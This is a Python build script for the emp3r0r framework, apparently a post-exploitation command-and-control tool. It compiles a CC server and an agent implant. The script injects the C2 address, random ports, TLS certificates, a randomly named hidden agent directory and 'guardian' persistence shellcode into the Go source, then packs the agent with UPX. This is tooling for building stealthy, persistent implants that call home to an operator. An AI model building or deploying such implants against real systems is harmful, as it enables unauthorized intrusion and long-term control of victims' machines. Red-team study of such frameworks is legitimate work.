#!/usr/bin/env python3

# pylint: disable=invalid-name, broad-except, too-many-arguments, too-many-instance-attributes, line-too-long

'''
this script replaces build.sh, coz bash/sed/awk is driving me insane
'''

import atexit
import glob
import json
import os
import random
import readline
import shutil
import subprocess
import sys
import traceback
import uuid


class GoBuild:
    '''
    all-in-one builder
    '''

    def __init__(self, target="cc",
                 cc_indicator="cc_indicator", cc_ip="[cc_ipaddr]", cc_other_names=""):
        self.target = target
        self.GOOS = os.getenv("GOOS")
        self.GOARCH = os.getenv("GOARCH")

        if self.GOOS is None:
            self.GOOS = "linux"

        if self.GOARCH is None:
            self.GOARCH = "amd64"

        # CA
        self.CA = ""

        # tags
        self.CCIP = cc_ip
        self.CC_OTHER_NAMES = cc_other_names
        self.INDICATOR = cc_indicator
        self.UUID = str(uuid.uuid1())
        self.VERSION = get_version()

        # agent root directory

        if "agent_root" in CACHED_CONF:
            self.AgentRoot = CACHED_CONF['agent_root']
        else:
            self.AgentRoot = f".{rand_str(random.randint(3, 9))}"
            CACHED_CONF['agent_root'] = self.AgentRoot

    def build(self):
        '''
        cd to cmd and run go build
        '''
        self.gen_certs()
        # CA
        if 'ca' in CACHED_CONF:
            log_warn(
                f"Using cached CA cert ({CACHED_CONF['ca']}),\nmake sure you have the coresponding keypair signed by it")
            self.CA = CACHED_CONF['ca']
        else:
            f = open("./tls/rootCA.crt")
            self.CA = f.read()
            f.close()

            # cache CA, too
            CACHED_CONF['ca'] = self.CA

        # cache version
        CACHED_CONF['version'] = self.VERSION

        # write cache
        json_file = open(BUILD_JSON, "w+")
        json.dump(CACHED_CONF, json_file)
        json_file.close()

        self.set_tags()

        # copy the server/cc keypair to ./build for later use
        if os.path.isdir("./tls"):
            log_warn("[*] Copying CC keypair to ./build")
            for f in glob.glob("./tls/emp3r0r-*pem"):
                print(f" Copy {f} to ./build")
                shutil.copy(f, "./build")

        try:
            os.chdir(f"./cmd/{self.target}")
        except BaseException:
            log_error(f"Cannot cd to cmd/{self.target}")

            return

        log_warn("GO BUILD starts...")
        build_target = f"../../build/{self.target}"
        if self.target == "agent":
            build_target = f"../../build/{self.target}-{self.UUID}"
        # cmd = f'''GOOS={self.GOOS} GOARCH={self.GOARCH}''' + \
        # f''' go build -ldflags='-s -w -extldflags "-static"' -o ../../build/{self.target}'''
        cmd = f'''GOOS={self.GOOS} GOARCH={self.GOARCH} CGO_ENABLED=0''' + \
            f''' go build -ldflags='-s -w' -o {build_target}'''
        os.system(cmd)
        log_warn("GO BUILD ends...")

        os.chdir("../../")
        self.unset_tags()

        targetFile = f"./build/{build_target.split('/')[-1]}"
        if os.path.exists(targetFile):
            if not targetFile.endswith("/cc"):
                os.system(f"upx -9 {targetFile}")
            else:
                log_warn(f"{targetFile} generated")
        else:
            log_error("go build failed")
            sys.exit(1)

    def gen_certs(self):
        '''
        generate server cert/key, and CA if necessary
        '''

        if "ccip" in CACHED_CONF:
            if self.CCIP == CACHED_CONF['ccip'] and os.path.exists("./build/emp3r0r-key.pem"):
                return

        log_warn("[!] Generating new certs...")
        try:
            os.chdir("./tls")
            os.system(
                f"bash ./genkey-with-ip-san.sh {self.UUID} {self.UUID}.com {self.CCIP} {self.CC_OTHER_NAMES}")
            os.rename(f"./{self.UUID}-cert.pem", "./emp3r0r-cert.pem")
            os.rename(f"./{self.UUID}-key.pem", "./emp3r0r-key.pem")
            os.chdir("..")
        except BaseException as exc:
            log_error(
                f"[-] Something went wrong, see above for details: {exc}")
            sys.exit(1)

    def unset_tags(self):
        '''
        restore tags in the source
        '''

        # version
        sed("./lib/agent/def.go",
            f"Version = \"{self.VERSION}\"", "Version = \"[emp3r0r_version_string]\"")
        # agent root path
        sed("./lib/agent/def.go",
            self.AgentRoot, "[agent_root]")
        # CA
        sed("./lib/tun/tls.go", self.CA, "[emp3r0r_ca]")
        if self.target == "agent":
            # guardian_shellcode
            sed("./lib/agent/def.go", f"GuardianShellcode = `{CACHED_CONF['guardian_shellcode']}`",
                "GuardianShellcode = `[persistence_shellcode]`")
            sed("./lib/agent/def.go", f"GuardianAgentPath = \"{CACHED_CONF['guardian_agent_path']}\"",
                "GuardianAgentPath = \"[persistence_agent_path]\"")
        # cc indicator
        sed("./lib/agent/def.go", self.INDICATOR, "[cc_indicator]")
        # in case we use the same IP for indicator and CC
        sed("./lib/agent/def.go", self.CCIP, "[cc_ipaddr]")
        sed("./lib/agent/def.go", self.UUID, "[agent_uuid]")
        # restore ports
        sed("./lib/agent/def.go",
            f"CCPort = \"{CACHED_CONF['cc_port']}\"", "CCPort = \"[cc_port]\"")
        sed("./lib/agent/def.go",
            f"ProxyPort = \"{CACHED_CONF['proxy_port']}\"", "ProxyPort = \"[proxy_port]\"")
        sed("./lib/agent/def.go",
            f"BroadcastPort = \"{CACHED_CONF['broadcast_port']}\"", "BroadcastPort = \"[broadcast_port]\"")

    def set_tags(self):
        '''
        modify some tags in the source
        '''

        # version
        sed("./lib/agent/def.go",
            "Version = \"[emp3r0r_version_string]\"", f"Version = \"{self.VERSION}\"")
        if self.target == "agent":
            # guardian shellcode
            sed("./lib/agent/def.go",
                "[persistence_shellcode]", CACHED_CONF['guardian_shellcode'])
            sed("./lib/agent/def.go",
                "[persistence_agent_path]", CACHED_CONF['guardian_agent_path'])
        # CA
        sed("./lib/tun/tls.go", "[emp3r0r_ca]", self.CA)
        # CC IP
        sed("./lib/agent/def.go", "[cc_ipaddr]", self.CCIP)
        # agent root path
        sed("./lib/agent/def.go", "[agent_root]", self.AgentRoot)
        # indicator
        sed("./lib/agent/def.go", "[cc_indicator]", self.INDICATOR)
        # agent UUID
        sed("./lib/agent/def.go", "[agent_uuid]", self.UUID)
        # ports
        sed("./lib/agent/def.go",
            "[cc_port]", CACHED_CONF['cc_port'])
        sed("./lib/agent/def.go",
            "[proxy_port]", CACHED_CONF['proxy_port'])
        sed("./lib/agent/def.go",
            "[broadcast_port]", CACHED_CONF['broadcast_port'])


def clean():
    '''
    clean build output
    '''
    to_rm = glob.glob("./tls/emp3r0r*") + glob.glob("./tls/openssl-*") + \
        glob.glob("./build/*") + glob.glob("./tls/*.csr")

    for f in to_rm:
        try:
            # remove directories too

            if os.path.isdir(f):
                os.removedirs(f)
            else:
                os.remove(f)
            print(" Deleted "+f)
        except BaseException:
            log_error(traceback.format_exc)


def sed(path, old, new):
    '''
    works like `sed -i s/old/new/g file`
    '''
    rf = open(path)
    text = rf.read()
    to_write = text.replace(old, new)
    rf.close()

    f = open(path, "w")
    f.write(to_write)
    f.close()


def yes_no(prompt):
    '''
    y/n?
    '''

    if yes_to_all:
        log_warn(f"Choosing 'yes' for '{prompt}'")

        return True

    answ = input(prompt + " [Y/n] ").lower().strip()

    if answ in ["n", "no", "nah", "nay"]:
        return False

    return True


def rand_str(length):
    '''
    random string
    '''
    uuidstr = str(uuid.uuid4()).replace('-', '')

    # we don't want the string to be long

    if length >= len(uuidstr):
        return uuidstr

    return uuidstr[:length]


def main(target):
    '''
    main main main
    '''
    ccip = "[cc_ipaddr]"
    indicator = "[cc_indicator]"
    use_cached = False

    if target == "clean":
        clean()

        return

    # cc IP

    if "ccip" in CACHED_CONF:
        ccip = CACHED_CONF['ccip']
        use_cached = yes_no(f"Use cached CC address ({ccip})?")

    if not use_cached:
        if yes_no("Clean everything and start over?"):
            clean()
        ccip = input("CC server address (domain name or ip address): ").strip()
        CACHED_CONF['ccip'] = ccip

    if target == "cc":
        cc_other = ""

        if not os.path.exists("./build/emp3r0r-key.pem"):
            cc_other = input(
                "Additional CC server addresses (separate with space): ").strip()
        gobuild = GoBuild(target="cc", cc_ip=ccip, cc_other_names=cc_other)
        gobuild.build()

        return

    if target != "agent":
        print("Unknown target")

        return

    # indicator

    use_cached = False

    if "cc_indicator" in CACHED_CONF:
        indicator = CACHED_CONF['cc_indicator']
        use_cached = yes_no(f"Use cached CC indicator ({indicator})?")

    if not use_cached:
        indicator = input("CC status indicator: ").strip()
        CACHED_CONF['cc_indicator'] = indicator

    # guardian shellcode

    use_cached = False

    if "guardian_shellcode" in CACHED_CONF and "guardian_agent_path" in CACHED_CONF:
        guardian_shellcode = CACHED_CONF['guardian_shellcode']
        guardian_agent_path = CACHED_CONF['guardian_agent_path']
        use_cached = yes_no(
            f"Use cached {len(guardian_shellcode)} bytes of guardian shellcode ({guardian_agent_path})?")

    if not use_cached:
        path = input("Agent path for guardian shellcode: ").strip()
        CACHED_CONF['guardian_shellcode'] = gen_guardian_shellcode(path)
        CACHED_CONF['guardian_agent_path'] = path

    gobuild = GoBuild(target="agent", cc_indicator=indicator, cc_ip=ccip)
    gobuild.build()


def log_error(msg):
    '''
    print in red
    '''
    print("\u001b[31m"+msg+"\u001b[0m")


def log_warn(msg):
    '''
    print in yellow
    '''
    print("\u001b[33m"+msg+"\u001b[0m")


def save(prev_h_len, hfile):
    '''
    append to histfile
    '''
    new_h_len = readline.get_current_history_length()
    readline.set_history_length(1000)
    readline.append_history_file(new_h_len - prev_h_len, hfile)


# JSON config file, cache some user data
BUILD_JSON = "./build/build.json"
CACHED_CONF = {}

if os.path.exists(BUILD_JSON):
    try:
        jsonf = open(BUILD_JSON)
        CACHED_CONF = json.load(jsonf)
        jsonf.close()
    except BaseException:
        log_warn(traceback.format_exc())


def rand_port():
    '''
    returns a random int between 1024 and 65535
    '''

    return str(random.randint(1025, 65534))


def randomize_ports():
    '''
    randomize every port used by emp3r0r agent,
    cache them in build.json
    '''

    if 'cc_port' not in CACHED_CONF:
        CACHED_CONF['cc_port'] = rand_port()

    if 'proxy_port' not in CACHED_CONF:
        CACHED_CONF['proxy_port'] = rand_port()

    if 'broadcast_port' not in CACHED_CONF:
        CACHED_CONF['broadcast_port'] = rand_port()


def gen_guardian_shellcode(path):
    '''
    ../shellcode/gen.py
    '''
    try:
        pwd = os.getcwd()
        os.chdir("../shellcode")
        out = subprocess.check_output(["python3", "gen.py", path])
        os.chdir(pwd)

        shellcode = out.decode('utf-8')

        if "Failed" in shellcode:
            log_error("Failed to generate shellcode: "+out)

            return "N/A"
    except BaseException:
        log_error(traceback.format_exc())

        return "N/A"

    return shellcode


def get_version():
    '''
    print current version
    '''
    try:
        check = "git describe --tags"
        out = subprocess.check_output(
            ["/bin/sh", "-c", check],
            stderr=subprocess.STDOUT, timeout=3)
    except KeyboardInterrupt:
        return "Unknown"
    except BaseException:
        check = "git describe --always"
        try:
            out = subprocess.check_output(
                ["/bin/sh", "-c", check],
                stderr=subprocess.STDOUT, timeout=3)
        except BaseException:
            try:
                versionf = open(".version")
                version = versionf.read().strip()
                versionf.close()
                return version
            except BaseException:
                return "Unknown"

    return out.decode("utf-8").strip()


# command line args
yes_to_all = False

if len(sys.argv) < 2:
    print(f"python3 {sys.argv[0]} cc/agent [-y]")
    sys.exit(1)
elif len(sys.argv) == 3:
    # if `-y` is specified, no questions will be asked
    yes_to_all = sys.argv[2] == "-y"

try:
    randomize_ports()

    if not os.path.exists("./build"):
        os.mkdir("./build")

    # support GNU readline interface, command history
    histfile = "./build/.build_py_history"
    try:
        readline.read_history_file(histfile)
        h_len = readline.get_current_history_length()
    except FileNotFoundError:
        open(histfile, 'wb').close()
        h_len = 0
    atexit.register(save, h_len, histfile)

    main(sys.argv[1])
except (KeyboardInterrupt, EOFError, SystemExit):
    sys.exit(0)
except BaseException:
    log_error(f"[!] Exception:\n{traceback.format_exc()}")
